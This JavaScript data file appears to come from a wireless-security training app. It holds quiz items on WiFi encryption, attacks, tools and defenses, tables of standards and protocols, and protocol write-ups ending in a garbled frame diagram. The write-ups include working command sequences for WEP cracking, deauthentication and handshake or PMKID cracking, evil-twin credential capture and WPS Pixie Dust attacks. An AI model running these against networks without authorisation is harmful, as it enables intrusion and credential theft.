  { id: 26, question: "Why is hiding your SSID not effective security?", options: ["The SSID is still transmitted in probe requests and other frames", "Hidden SSIDs are illegal", "It prevents all connections", "Modern routers can't hide SSIDs"], correctAnswer: 0, explanation: "Hidden SSIDs only remove the name from beacon frames. The SSID is still transmitted in probe requests, probe responses, association requests, and reassociation frames. Any wireless sniffer can easily discover hidden networks.", topic: "Encryption" },
  { id: 27, question: "What is 802.11w and what does it protect?", options: ["A faster WiFi standard", "Protected Management Frames - encrypts deauth/disassoc frames", "A wireless printing protocol", "Enterprise authentication"], correctAnswer: 1, explanation: "802.11w (PMF - Protected Management Frames) encrypts and authenticates management frames like deauthentication and disassociation. This prevents attackers from forging these frames to disconnect clients.", topic: "Encryption" },
  { id: 28, question: "What is the difference between WPA2-Personal and WPA2-Enterprise?", options: ["Personal is faster, Enterprise is slower", "Personal uses a shared password (PSK), Enterprise uses individual credentials via RADIUS", "Enterprise uses WEP, Personal uses AES", "There is no difference"], correctAnswer: 1, explanation: "WPA2-Personal uses a pre-shared key (same password for everyone). WPA2-Enterprise uses 802.1X with a RADIUS server, giving each user unique credentials for better accountability and security.", topic: "Encryption" },
  { id: 29, question: "What is EAP in wireless security?", options: ["Extended Access Protocol for faster speeds", "Extensible Authentication Protocol - framework for enterprise authentication methods", "Encrypted Access Point", "Emergency Alert Protocol"], correctAnswer: 1, explanation: "EAP (Extensible Authentication Protocol) is a framework used in WPA2-Enterprise. It supports various authentication methods like EAP-TLS (certificates), PEAP (password), and EAP-TTLS.", topic: "Encryption" },
  { id: 30, question: "What makes WPA3-Enterprise 192-bit mode special?", options: ["It uses a 192-bit password", "It uses CNSA-approved algorithms for government/sensitive environments", "It's 192 times faster than WPA2", "It supports 192 simultaneous users"], correctAnswer: 1, explanation: "WPA3-Enterprise 192-bit mode uses Commercial National Security Algorithm (CNSA) suite with 192-bit minimum security strength. This includes AES-256-GCM, SHA-384, and ECDH/ECDSA with P-384 curves.", topic: "Encryption" },

  // ============ ATTACKS (15 questions) ============
  { id: 31, question: "Why is the 'WPA 4-way handshake' important to attackers?", options: ["It contains the network password in plain text", "It can be captured and used to try password guesses offline", "It gives direct access to the router's admin panel", "It broadcasts the network's IP addresses"], correctAnswer: 1, explanation: "The 4-way handshake contains enough information to verify if a password guess is correct. Attackers capture it, then use powerful computers to try millions of passwords per second offline, without alerting the network.", topic: "Attacks" },
  { id: 32, question: "What is a 'deauthentication attack' and why does it work?", options: ["It cracks the network password directly", "It floods fake 'disconnect' commands that clients trust because management frames aren't encrypted", "It requires physical access to the router", "It only works on WPA3 networks"], correctAnswer: 1, explanation: "WiFi management frames (like deauthentication) are not encrypted by default. Attackers can forge these frames to disconnect clients, forcing them to reconnect. This is often used to capture handshakes.", topic: "Attacks" },
  { id: 33, question: "What is an 'Evil Twin' attack?", options: ["Installing malware on the router", "Creating a fake access point with the same name as a legitimate one to intercept connections", "Using two antennas for better range", "Connecting to two networks simultaneously"], correctAnswer: 1, explanation: "An Evil Twin mimics a legitimate network's SSID (and sometimes BSSID). Users see the familiar network name and connect. The attacker can then intercept all traffic, serve fake pages, or capture credentials.", topic: "Attacks" },
  { id: 34, question: "What is PMKID and why is it significant for attackers?", options: ["A type of router firmware", "A value that can be captured without clients to crack passwords offline", "The password stored on the router", "A wireless encryption standard"], correctAnswer: 1, explanation: "PMKID (Pairwise Master Key Identifier) can be captured from a single association request to the AP, without needing any connected clients or deauthentication. It can then be cracked offline like a handshake.", topic: "Attacks" },
  { id: 35, question: "What is a Karma attack?", options: ["A philosophical approach to hacking", "An attack where a rogue AP responds to all probe requests, impersonating any network", "A denial of service attack", "An encryption downgrade attack"], correctAnswer: 1, explanation: "In a Karma attack, a rogue AP responds to all client probe requests regardless of SSID, claiming to be whatever network the client is looking for. This exploits devices that automatically reconnect to known networks.", topic: "Attacks" },
  { id: 36, question: "What is a MITM (Man-in-the-Middle) attack in wireless context?", options: ["Physically standing between two routers", "Intercepting and potentially modifying traffic between a client and AP", "Attacking from multiple locations", "A type of password cracking"], correctAnswer: 1, explanation: "Wireless MITM attacks involve positioning yourself between the victim and the legitimate network, often using an evil twin. All traffic passes through the attacker, who can eavesdrop, modify data, or inject malicious content.", topic: "Attacks" },
  { id: 37, question: "What is a beacon flood attack?", options: ["Overwhelming a network with data traffic", "Broadcasting thousands of fake SSIDs to confuse clients and tools", "Stealing beacon frames from an AP", "Injecting malware via beacon frames"], correctAnswer: 1, explanation: "A beacon flood broadcasts thousands of fake beacon frames with random SSIDs. This can overwhelm wireless scanning tools, confuse users trying to find legitimate networks, and may crash vulnerable devices.", topic: "Attacks" },
  { id: 38, question: "What is the Hole196 vulnerability?", options: ["A physical security flaw", "An insider attack allowing GTK decryption and ARP poisoning on WPA2 networks", "A buffer overflow in driver code", "A WEP cracking technique"], correctAnswer: 1, explanation: "Hole196 exploits the shared GTK. An authenticated insider can use the GTK to decrypt other clients' broadcast traffic and perform ARP poisoning, potentially leading to MITM attacks within the network.", topic: "Attacks" },
  { id: 39, question: "What is a dictionary attack in wireless security?", options: ["Attacking networks named after dictionary words", "Testing captured handshakes against a list of potential passwords", "Using a dictionary to decode encryption", "Social engineering using language skills"], correctAnswer: 1, explanation: "A dictionary attack tests a captured handshake against a wordlist of potential passwords. Tools like hashcat can test billions of candidates per second using GPUs, making weak passwords vulnerable.", topic: "Attacks" },
  { id: 40, question: "What is the Caffe-Latte attack?", options: ["Social engineering in coffee shops", "Attacking a WEP client to recover the key without an AP present", "A MITM attack using caffeine as bait", "DNS spoofing at cafes"], correctAnswer: 1, explanation: "Caffe-Latte attacks a WEP client directly by injecting gratuitous ARP requests. The client responds with encrypted packets, allowing the attacker to collect IVs and crack the WEP key without the AP.", topic: "Attacks" },
  { id: 41, question: "What is Dragonblood and what does it affect?", options: ["A WEP cracking tool", "Vulnerabilities in WPA3's SAE handshake allowing offline dictionary attacks", "A type of antenna", "A WiFi 6 feature"], correctAnswer: 1, explanation: "Dragonblood is a set of vulnerabilities in WPA3's SAE (Dragonfly) handshake discovered in 2019. It includes side-channel attacks and downgrade attacks that can enable password recovery.", topic: "Attacks" },
  { id: 42, question: "What is a fragmentation attack in WEP?", options: ["Breaking the AP into pieces", "Using one encrypted fragment to generate keystream for injecting arbitrary packets", "Fragmenting the password", "Splitting files during transfer"], correctAnswer: 1, explanation: "The WEP fragmentation attack captures a single encrypted packet and uses it to generate keystream. This keystream can then be used to encrypt and inject arbitrary packets, even without knowing the WEP key.", topic: "Attacks" },
  { id: 43, question: "What is probe request tracking and why is it a privacy concern?", options: ["Tracking router locations", "Devices broadcast SSIDs they've connected to, revealing location history", "Tracking packet counts", "Monitoring probe signal strength"], correctAnswer: 1, explanation: "Devices send probe requests containing SSIDs of networks they've connected to. These reveal your network history (home, work, hotels visited) and can be used for tracking, even with MAC randomization.", topic: "Attacks" },
  { id: 44, question: "What is a replay attack in wireless security?", options: ["Recording and playing back audio", "Capturing valid packets and retransmitting them to cause repeated actions", "Replaying videos over WiFi", "Resetting the router"], correctAnswer: 1, explanation: "Replay attacks capture legitimate packets (like ARP requests in WEP) and retransmit them repeatedly. This generates traffic needed for attacks or causes repeated authentication/action in the network.", topic: "Attacks" },
  { id: 45, question: "What is WPS Pixie Dust attack?", options: ["A cosmetic attack on router LEDs", "Exploiting weak random number generation in WPS to crack the PIN instantly", "Physical dust in the router", "A denial of service attack"], correctAnswer: 1, explanation: "Pixie Dust exploits routers that use weak or predictable random numbers in WPS. By analyzing the public nonces, attackers can mathematically derive the WPS PIN in seconds rather than hours of brute-forcing.", topic: "Attacks" },

  // ============ TOOLS (15 questions) ============
  { id: 46, question: "What hardware do you need for wireless penetration testing that's different from normal WiFi?", options: ["A more expensive router", "A wireless adapter that supports monitor mode and packet injection", "A satellite dish", "Normal laptop WiFi works perfectly"], correctAnswer: 1, explanation: "Normal WiFi adapters only show traffic addressed to you. Penetration testing requires adapters with special chipsets (like Atheros AR9271) that support monitor mode (capture all traffic) and packet injection (send custom frames).", topic: "Tools" },
  { id: 47, question: "What is the purpose of monitor mode on a wireless adapter?", options: ["To increase WiFi speed", "To capture all wireless traffic regardless of destination", "To improve signal strength", "To connect to multiple networks simultaneously"], correctAnswer: 1, explanation: "Monitor mode allows the adapter to capture all 802.11 frames in range, not just those addressed to it. This is essential for passive reconnaissance, handshake capture, and understanding network traffic patterns.", topic: "Tools" },
  { id: 48, question: "What is the aircrack-ng suite primarily used for?", options: ["Creating WiFi networks", "Assessing WiFi network security through monitoring, attacking, testing, and cracking", "Boosting WiFi signal strength", "Blocking malicious WiFi traffic"], correctAnswer: 1, explanation: "Aircrack-ng is the most widely used wireless security assessment suite. It includes tools for monitoring (airodump-ng), attacking (aireplay-ng), testing (packetforge-ng), and cracking (aircrack-ng).", topic: "Tools" },
  { id: 49, question: "What does airodump-ng do?", options: ["Cracks WiFi passwords", "Captures wireless packets and displays network information", "Creates fake access points", "Boosts signal strength"], correctAnswer: 1, explanation: "Airodump-ng is a packet capture tool that displays all visible access points and clients, their encryption types, channels, signal strength, and more. It's used for reconnaissance and handshake capture.", topic: "Tools" },
  { id: 50, question: "What is aireplay-ng used for?", options: ["Playing music over WiFi", "Packet injection for generating traffic or attacking networks", "Displaying network information", "Configuring network settings"], correctAnswer: 1, explanation: "Aireplay-ng injects packets into wireless networks. It's used for deauthentication attacks, fake authentication, ARP replay (to generate traffic), and other packet injection techniques.", topic: "Tools" },
  { id: 51, question: "What tool is commonly used for creating evil twin access points?", options: ["Nmap", "Hostapd or tools like Fluxion/Wifiphisher", "Wireshark", "Metasploit"], correctAnswer: 1, explanation: "Hostapd can create software access points. Tools like Fluxion, Wifiphisher, and airgeddon automate evil twin attacks with captive portals, often including deauthentication and credential capture.", topic: "Tools" },
  { id: 52, question: "What is Wireshark used for in wireless testing?", options: ["Cracking passwords", "Analyzing captured wireless traffic in detail", "Creating access points", "Boosting signal strength"], correctAnswer: 1, explanation: "Wireshark is a packet analyzer that provides deep inspection of captured traffic. For wireless, it can decode 802.11 frames, show handshakes, analyze protocols, and help understand network behavior.", topic: "Tools" },
  { id: 53, question: "What is hashcat and how is it used in wireless attacks?", options: ["A wireless sniffer", "A GPU-accelerated password cracking tool for handshakes and PMKIDs", "A network scanner", "An access point creator"], correctAnswer: 1, explanation: "Hashcat is the fastest password cracking tool, using GPUs to test billions of candidates per second. For WiFi, it cracks captured WPA handshakes and PMKIDs using dictionaries, rules, and brute force.", topic: "Tools" },
  { id: 54, question: "What is Kismet used for?", options: ["Password cracking", "Wireless network detection, sniffing, and intrusion detection", "Creating fake networks", "Router configuration"], correctAnswer: 1, explanation: "Kismet is a wireless network detector, sniffer, and WIDS. It passively discovers networks (including hidden ones), logs packets, detects intrusions, and can work with GPS for wardriving.", topic: "Tools" },
  { id: 55, question: "What is Reaver used for?", options: ["WPA2 cracking", "WPS PIN brute-force attacks", "Deauthentication attacks", "Network scanning"], correctAnswer: 1, explanation: "Reaver performs brute-force attacks against WPS (WiFi Protected Setup) PINs. It exploits the WPS design flaw that reduces the keyspace from 100 million to ~11,000 combinations.", topic: "Tools" },
  { id: 56, question: "What chipsets are recommended for wireless penetration testing?", options: ["Any Intel chipset", "Atheros AR9271, Ralink RT3070, RTL8812AU", "Only Qualcomm chips", "Built-in laptop WiFi"], correctAnswer: 1, explanation: "Certain chipsets have driver support for monitor mode and packet injection. Popular choices include Atheros AR9271 (ALFA AWUS036NHA), Ralink RT3070, and RTL8812AU (for 5GHz support).", topic: "Tools" },
  { id: 57, question: "What is Bettercap used for in wireless testing?", options: ["Only Bluetooth attacks", "Network attacks including WiFi deauth, evil twin, and MITM", "Password generation", "Router firmware updates"], correctAnswer: 1, explanation: "Bettercap is a Swiss army knife for network attacks. Its WiFi module supports reconnaissance, deauthentication, client tracking, evil twin attacks, and integrates with other attack modules.", topic: "Tools" },
  { id: 58, question: "What is MDK3/MDK4 primarily used for?", options: ["Password cracking", "Wireless stress testing and denial of service attacks", "Network mapping", "Encryption analysis"], correctAnswer: 1, explanation: "MDK3/MDK4 is a proof-of-concept tool for wireless attacks including beacon flooding, authentication DoS, deauthentication, and WDS confusion. It's used for testing network resilience.", topic: "Tools" },
  { id: 59, question: "What does hcxdumptool do?", options: ["Displays network info", "Captures WPA handshakes and PMKIDs for hashcat", "Creates access points", "Cracks passwords"], correctAnswer: 1, explanation: "Hcxdumptool is optimized for capturing PMKIDs and handshakes for use with hashcat. It's more efficient than airodump-ng for this purpose and can target specific networks.", topic: "Tools" },
  { id: 60, question: "What is Airgeddon?", options: ["A wireless chipset", "An all-in-one bash script automating wireless attacks", "A type of antenna", "A protocol analyzer"], correctAnswer: 1, explanation: "Airgeddon is a multi-use bash script for wireless auditing. It provides a menu-driven interface for handshake capture, evil twin attacks, WPS attacks, and integrates various wireless tools.", topic: "Tools" },

  // ============ SECURITY & DEFENSE (10 questions) ============
  { id: 61, question: "Why is MAC address filtering NOT effective security?", options: ["MAC addresses can easily be changed/spoofed in software", "MAC addresses are encrypted and can't be read", "Only enterprise networks have MAC addresses", "MAC filtering is the strongest form of WiFi security"], correctAnswer: 0, explanation: "MAC addresses are transmitted in every frame's unencrypted header. Attackers can see authorized MACs, then change their adapter's MAC to match. It takes about 5 seconds to bypass.", topic: "Security" },
  { id: 62, question: "What does WPS (WiFi Protected Setup) provide and why is it risky?", options: ["Faster internet speeds", "Easy network setup via PIN that can be brute-forced", "Better encryption than WPA2", "Protection against evil twin attacks"], correctAnswer: 1, explanation: "WPS allows connecting via an 8-digit PIN. Due to a design flaw, only 11,000 combinations need to be tried (not 100 million). Many routers are also vulnerable to Pixie Dust attacks that crack the PIN instantly.", topic: "Security" },
  { id: 63, question: "What is a rogue access point?", options: ["A faulty router", "An unauthorized AP connected to a network, potentially for malicious purposes", "An AP with a weak password", "A mobile hotspot"], correctAnswer: 1, explanation: "A rogue AP is an unauthorized access point on a network. It could be installed by an attacker to capture credentials, bypass security controls, or by employees creating security holes (shadow IT).", topic: "Security" },
  { id: 64, question: "What is WIDS/WIPS?", options: ["A WiFi speed standard", "Wireless Intrusion Detection/Prevention System for monitoring and protecting networks", "A type of encryption", "A router configuration tool"], correctAnswer: 1, explanation: "WIDS (Detection) and WIPS (Prevention) monitor wireless airspace for threats like rogue APs, deauth attacks, and policy violations. WIPS can actively block threats by sending deauthentication frames.", topic: "Security" },
  { id: 65, question: "What is the best password practice for WPA2/WPA3 networks?", options: ["8 character password", "Long, random passphrase of 15+ characters with mixed types", "Using the network name as password", "Simple words that are easy to remember"], correctAnswer: 1, explanation: "WPA passwords should be 15+ characters, random, and include mixed case, numbers, and symbols. This makes dictionary attacks impractical and brute force infeasible. Passphrases like 'correct-horse-battery-staple' work well.", topic: "Security" },
  { id: 66, question: "Why should you disable WPS on your router?", options: ["It slows down the network", "It's vulnerable to brute-force and Pixie Dust attacks", "It uses too much power", "It conflicts with WPA3"], correctAnswer: 1, explanation: "WPS has fundamental design flaws making it vulnerable to PIN brute-forcing and Pixie Dust attacks. Even with lockout, many routers can be attacked. Disable WPS entirely for security.", topic: "Security" },
  { id: 67, question: "What should enterprises use instead of WPA2-Personal?", options: ["WEP for compatibility", "WPA2-Enterprise with 802.1X authentication", "MAC filtering", "Hidden SSID"], correctAnswer: 1, explanation: "WPA2-Enterprise provides individual user credentials, accountability through logging, easy credential revocation, and eliminates the shared password vulnerability. It requires a RADIUS server but provides much better security.", topic: "Security" },
  { id: 68, question: "What is network segmentation and why is it important for WiFi security?", options: ["Dividing bandwidth equally", "Separating guest/IoT/corporate traffic to limit breach impact", "Using multiple SSIDs for decoration", "Segmenting the password"], correctAnswer: 1, explanation: "Network segmentation puts different device types on separate VLANs/subnets. A compromised IoT device can't reach corporate servers. Guest WiFi should be isolated from internal resources.", topic: "Security" },
  { id: 69, question: "What is certificate-based authentication in wireless?", options: ["Using printed certificates", "Using digital certificates (EAP-TLS) for mutual authentication", "Certifying the router's authenticity", "A government certification program"], correctAnswer: 1, explanation: "EAP-TLS uses digital certificates on both client and server. This provides mutual authentication, eliminates password vulnerabilities, and is the most secure enterprise wireless authentication method.", topic: "Security" },
  { id: 70, question: "Why should you keep router firmware updated?", options: ["For new features only", "To patch security vulnerabilities and fix bugs", "It's not necessary", "To increase WiFi speed"], correctAnswer: 1, explanation: "Router firmware updates patch security vulnerabilities, fix bugs, and sometimes add features. Unpatched routers are targets for known exploits. Enable auto-update or check regularly.", topic: "Security" },

  // ============ ENTERPRISE (5 questions) ============
  { id: 71, question: "What makes enterprise WiFi (WPA2-Enterprise) more secure than WPA2-Personal?", options: ["It uses a longer password", "Each user has individual credentials authenticated via RADIUS", "It only works on newer hardware", "It hides the network SSID"], correctAnswer: 1, explanation: "WPA2-Enterprise uses 802.1X authentication with individual credentials verified by a RADIUS server. This provides accountability, easier credential revocation, and eliminates the shared password vulnerability.", topic: "Enterprise" },
  { id: 72, question: "What is a RADIUS server in wireless networking?", options: ["A circular antenna", "An authentication server that validates user credentials for network access", "A signal booster", "A type of access point"], correctAnswer: 1, explanation: "RADIUS (Remote Authentication Dial-In User Service) is a server that authenticates users for WPA2/3-Enterprise. It checks credentials against a database (like Active Directory) and can enforce policies.", topic: "Enterprise" },
  { id: 73, question: "What is 802.1X?", options: ["A WiFi speed standard", "Port-based network access control for authentication", "A wireless frequency", "An antenna type"], correctAnswer: 1, explanation: "802.1X is a standard for port-based network access control. In wireless, it controls access at the AP 'port' level, requiring authentication via EAP before granting network access. It's the basis for WPA2/3-Enterprise.", topic: "Enterprise" },
  { id: 74, question: "What is NAC (Network Access Control)?", options: ["A type of encryption", "A system that checks device compliance before granting network access", "A WiFi channel", "A router setting"], correctAnswer: 1, explanation: "NAC systems verify that devices meet security requirements (updated OS, antivirus, etc.) before allowing network access. Non-compliant devices may be quarantined or given limited access.", topic: "Enterprise" },
  { id: 75, question: "What is the purpose of wireless network monitoring in enterprise environments?", options: ["To spy on employees", "To detect rogue APs, attacks, performance issues, and policy violations", "To increase WiFi speed", "To block all wireless traffic"], correctAnswer: 1, explanation: "Enterprise wireless monitoring detects security threats (rogue APs, evil twins, attacks), troubleshoots performance issues, ensures policy compliance, and provides visibility into the wireless environment.", topic: "Enterprise" },
];

const wifiStandards = [
  { standard: "802.11a", frequency: "5 GHz", maxSpeed: "54 Mbps", year: 1999, status: "Legacy" },
  { standard: "802.11b", frequency: "2.4 GHz", maxSpeed: "11 Mbps", year: 1999, status: "Legacy" },
  { standard: "802.11g", frequency: "2.4 GHz", maxSpeed: "54 Mbps", year: 2003, status: "Legacy" },
  { standard: "802.11n (Wi-Fi 4)", frequency: "2.4/5 GHz", maxSpeed: "600 Mbps", year: 2009, status: "Common" },
  { standard: "802.11ac (Wi-Fi 5)", frequency: "5 GHz", maxSpeed: "6.9 Gbps", year: 2013, status: "Common" },
  { standard: "802.11ax (Wi-Fi 6)", frequency: "2.4/5/6 GHz", maxSpeed: "9.6 Gbps", year: 2019, status: "Current" },
  { standard: "802.11be (Wi-Fi 7)", frequency: "2.4/5/6 GHz", maxSpeed: "46 Gbps", year: 2024, status: "Emerging" },
];

const securityProtocols = [
  { protocol: "WEP", year: 1997, security: "Broken", description: "Wired Equivalent Privacy - easily cracked in minutes", crackTime: "< 5 minutes", keyLength: "40/104-bit" },
  { protocol: "WPA", year: 2003, security: "Weak", description: "Wi-Fi Protected Access - TKIP vulnerable to attacks", crackTime: "Hours-Days", keyLength: "128-bit TKIP" },
  { protocol: "WPA2-Personal", year: 2004, security: "Moderate", description: "AES encryption, vulnerable to KRACK and dictionary attacks", crackTime: "Depends on PSK", keyLength: "128-bit AES" },
  { protocol: "WPA2-Enterprise", year: 2004, security: "Strong", description: "802.1X authentication with RADIUS server", crackTime: "Very difficult", keyLength: "128-bit AES" },
  { protocol: "WPA3-Personal", year: 2018, security: "Strong", description: "SAE (Dragonfly) handshake, forward secrecy", crackTime: "Extremely difficult", keyLength: "128-bit AES" },
  { protocol: "WPA3-Enterprise", year: 2018, security: "Very Strong", description: "192-bit security suite, enhanced protection", crackTime: "Not practical", keyLength: "192-bit AES" },
];

const protocolDetails = [
  {
    name: "WEP (Wired Equivalent Privacy)",
    status: "error",
    year: "1997",
    summary: "The original WiFi security protocol, now completely broken and should never be used.",
    vulnerabilities: [
      "24-bit Initialization Vector (IV) is too short - only ~16 million combinations",
      "IVs are transmitted in plaintext and reused frequently",
      "RC4 stream cipher has known weaknesses",
      "No protection against replay attacks",
      "CRC-32 checksum is not cryptographically secure",
    ],
    attacks: [
      { name: "PTW Attack", desc: "Crack WEP in under 60 seconds with enough IVs" },
      { name: "FMS Attack", desc: "Statistical attack exploiting weak IVs" },
      { name: "ChopChop", desc: "Decrypt packets one byte at a time" },
      { name: "Fragmentation", desc: "Obtain keystream from a single packet" },
      { name: "Caffe-Latte", desc: "Attack client without AP using gratuitous ARP" },
    ],
    commands: `# Enable monitor mode
airmon-ng start wlan0

# Capture packets (target channel 6)
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Generate traffic (ARP replay)
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon

# Crack the key (need ~40,000 IVs)
aircrack-ng capture-01.cap`,
  },
  {
    name: "WPA/WPA2-Personal (PSK)",
    status: "warning",
    year: "2003/2004",
    summary: "Pre-Shared Key mode used in homes and small businesses. Security depends on password strength.",
    vulnerabilities: [
      "Susceptible to offline dictionary attacks if handshake captured",
      "KRACK attack (2017) - Key Reinstallation Attack",
      "PMKID attack allows cracking without full handshake",
      "Weak passwords can be cracked in minutes",
      "No forward secrecy - captured traffic can be decrypted later",
    ],
    attacks: [
      { name: "4-Way Handshake Capture", desc: "Capture authentication exchange for offline cracking" },
      { name: "PMKID Attack", desc: "Extract PMKID from first EAPOL frame (no client needed)" },
      { name: "Dictionary Attack", desc: "Test captured handshake against wordlist" },
      { name: "KRACK Attack", desc: "Force nonce reuse to decrypt/inject traffic" },
      { name: "Deauth + Capture", desc: "Force reconnection to capture fresh handshake" },
    ],
    commands: `# Capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# Deauth client to force reconnection
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Crack with dictionary
aircrack-ng -w rockyou.txt handshake-01.cap

# PMKID capture with hcxdumptool
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Convert and crack PMKID
hcxpcapngtool -o hash.22000 pmkid.pcapng
hashcat -m 22000 hash.22000 wordlist.txt`,
  },
  {
    name: "WPA2-Enterprise (802.1X)",
    status: "info",
    year: "2004",
    summary: "Uses RADIUS server for authentication. Each user has unique credentials.",
    vulnerabilities: [
      "Rogue AP can capture credentials if certificate validation bypassed",
      "Some EAP methods transmit identity in cleartext",
      "PEAP/MSCHAPv2 credentials can be cracked offline",
      "Improper certificate validation common in mobile devices",
      "Legacy EAP methods (LEAP) are broken",
    ],
    attacks: [
      { name: "Evil Twin + hostapd-wpe", desc: "Capture enterprise credentials via rogue AP" },
      { name: "EAP Downgrade", desc: "Force client to use weaker authentication" },
      { name: "MSCHAPv2 Cracking", desc: "Offline attack on captured challenge/response" },
      { name: "Certificate Impersonation", desc: "Exploit missing or weak cert validation" },
      { name: "Identity Harvesting", desc: "Collect usernames from EAP identity responses" },
    ],
    commands: `# Setup evil twin with hostapd-wpe
# Edit hostapd-wpe.conf with target SSID
hostapd-wpe hostapd-wpe.conf

# Captured credentials appear in hostapd-wpe.log
# Format: username:challenge:response

# Crack MSCHAPv2 with asleap
asleap -C <challenge> -R <response> -W wordlist.txt

# Or use hashcat (mode 5500)
hashcat -m 5500 captured_hash.txt wordlist.txt`,
  },
  {
    name: "WPA3 & SAE",
    status: "success",
    year: "2018",
    summary: "Latest security standard using Simultaneous Authentication of Equals (SAE/Dragonfly).",
    vulnerabilities: [
      "Dragonblood vulnerabilities (CVE-2019-9494 to 9499)",
      "Side-channel attacks on SAE handshake",
      "Downgrade attacks to WPA2 on transition networks",
      "Implementation bugs in early deployments",
      "Still vulnerable if WPA3-Transition mode enabled",
    ],
    attacks: [
      { name: "Dragonblood", desc: "Timing and cache-based side-channel attacks" },
      { name: "Downgrade Attack", desc: "Force WPA2 mode on mixed networks" },
      { name: "DoS via SAE", desc: "Resource exhaustion with SAE commit messages" },
      { name: "Group Downgrade", desc: "Force weaker elliptic curve groups" },
    ],
    commands: `# WPA3 testing requires specific tools
# Dragonblood proof-of-concept
git clone https://github.com/vanhoefm/dragonslayer
cd dragonslayer

# Test for timing side-channel
./dragontime -i wlan0 -s "TargetSSID"

# Test for cache side-channel (requires local access)
./dragondrain -i wlan0 -s "TargetSSID"`,
  },
  {
    name: "WPS (WiFi Protected Setup)",
    status: "error",
    year: "2006",
    summary: "Designed for easy setup, but PIN-based authentication is fundamentally flawed.",
    vulnerabilities: [
      "8-digit PIN split into two halves verified separately",
      "Only 11,000 combinations to bruteforce (not 100 million)",
      "Pixie Dust attack can crack instantly if weak random numbers",
      "Many routers don't implement lockout properly",
      "Some routers have WPS enabled by default with no way to disable",
    ],
    attacks: [
      { name: "Online Bruteforce", desc: "Try all 11,000 PIN combinations" },
      { name: "Pixie Dust", desc: "Exploit weak random number generation" },
      { name: "Pin Null Attack", desc: "Some APs accept empty PIN" },
      { name: "WPS Lockout Bypass", desc: "Exploit rate limiting implementation flaws" },
    ],
    commands: `# Check if WPS is enabled
wash -i wlan0mon

# Pixie Dust attack (instant if vulnerable)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv

# Standard bruteforce (can take hours)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Using Bully
bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon`,
  },
];

// Part 2: Enhanced protocol deep dives with packet structures
const protocolPacketStructures = {
  wepFrame: {
    title: "WEP Encrypted Frame Structure",
    description: "Understanding WEP frame structure reveals why it's fundamentally broken",
    diagram: `
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                        WEP ENCRYPTED DATA FRAME                               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                               â”‚
â”‚  MAC HEADER (24 bytes)                                                        â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”‚
â”‚  â”‚Frame Ctrl  â”‚Duration  â”‚ Addr 1   â”‚ Addr 2   â”‚ Addr 3   â”‚Seq Control â”‚     â”‚
â”‚  â”‚  2 bytes   â”‚ 2 bytes  â”‚ 6 bytes  â”‚ 6 bytes  â”‚ 6 bytes  â”‚  2 bytes   â”‚     â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â”‚
â”‚                                                                               â”‚
â”‚  WEP PARAMETERS                                                               â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚
â”‚  â”‚   IV (3 bytes)          â”‚   Key ID (1 byte)                       â”‚      â”‚
â”‚  â”‚   PLAINTEXT! âš ï¸          â”‚   Bits 6-7 = key index                  â”‚      â”‚
â”‚  â”‚   Only 16.7M values     â”‚   Usually 0                             â”‚      â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚
â”‚                                                                               â”‚
â”‚  ENCRYPTED PAYLOAD                                                            â”‚
